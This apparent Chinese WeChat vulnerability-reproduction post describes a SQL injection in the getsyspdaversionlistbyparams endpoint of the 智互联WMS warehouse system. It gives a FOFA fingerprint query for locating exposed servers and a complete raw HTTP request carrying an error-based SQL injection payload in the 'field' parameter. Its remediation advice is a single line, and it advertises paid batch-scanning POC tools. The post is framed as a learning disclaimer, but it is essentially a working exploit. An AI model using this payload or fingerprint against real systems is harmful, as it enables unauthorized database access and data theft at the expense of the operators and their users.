#  智互联WMS getsyspdaversionlistbyparams接口存在SQL注入漏洞 附POC  
2026-5-7更新
                    2026-5-7更新  南风漏洞复现文库   2026-05-07 16:09  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 智互联WMS简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
智互联WMS  
## 2.漏洞描述  
  
智互联WMS配套移动终端物流解决方案,主要为了解决传统仓储中“账实不符”、“人工录入慢”、“找货难”等痛点,智互联WMS getsyspdaversionlistbyparams接口存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
智互联WMS  
![智互联WMS getsyspdaversionlistbyparams接口存在SQL注入漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6wGHZ7HibHTLcibLMqnfGdOO4MkhoC2k4ddiayJpkxoeuetImV5liayqk9A1eUbk1nGPTpCS1OicG9143eFt86eZRwIUcNEt6a03IYQ/640?wx_fmt=png&from=appmsg "null")  
  
智互联WMS getsyspdaversionlistbyparams接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
icon_hash="155833598"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams  
  
漏洞数据包：  
```
POST /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/json
Content-Length: 246

{
  "condition": {
    "field": "createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5(1),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)",
    "order": "asc"
  },
  "current": 1,
  "size": 1
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zg9ARrE88qY56wh8iap4YKJib2HphryPR17TqozgB0WfV1BPCLpMzEXFTcBibkRf5tyssOuc6ialnm2iaIhhGHnmoJwcUl2kvYocZw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
执行md5  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zicMsywcXPBmKWUV0JXtyichmkoc3nZokKDGyMVpYW8KPFKvBQ6liahdgcX5EpZ93D6Po7vGoovRIFQSItMBvkjDK8ACWjhJDkEE/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wYPwGyibzgY4v5hVdqpgTn4o4JGCB0BeCwcylCrh2nr1syB8wOguOdficFcYvMUGDcUGWUw95LOjT0WhuJeFYAK8380cD1VKJAg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zjogsaBEkqHDU7iaTdcAGoPpmnngAiawJNt8Xrxib6qrqRzicgabEJQOHRDxogqmSEI3Lzbjicd97WW1Tia0D05yXZyCiaMEbxMGu5Is/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6z8ThhZDzAWPmq9zzv5lJ31R8LyZE0LK3DUb7jCHU5IGMicBJutXzW2HWwGFicfibtlaC7VqroMKycEX17DdseGh8UtFibk3dib5j1E/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6xFVYcUE9k0ewLB63hHYqGlhficDnxZibicgMIA1qSbGgotPIpicP7UO763VBib1kWrLJJib2Aw0ROvJJEurQbQYKkV2OyiawbBiaBQiaCo/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zEsVhRr4qicicyHydTdwHJr4Vevic3wE2QCVXBXicGWlnrCNpUjAIqDictcgb4YDaD3EoHeLTCvuoNxZofxolCic0eZB56Y9CaT5fVY/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zom67ibI5a4aicuIsAvUiaVxaWSF8Zs6H25ffdMEPUXoFiaIibHPV7j4YHTb5ibqGqGNiakMaRtdglkbZbXPqMAaeKmNGLZ7cCrEOky4/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
[OpenCode content接口存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490371&idx=1&sn=84f3654b9de5305ce5055fd35fd53c27&scene=21#wechat_redirect)  
  
  
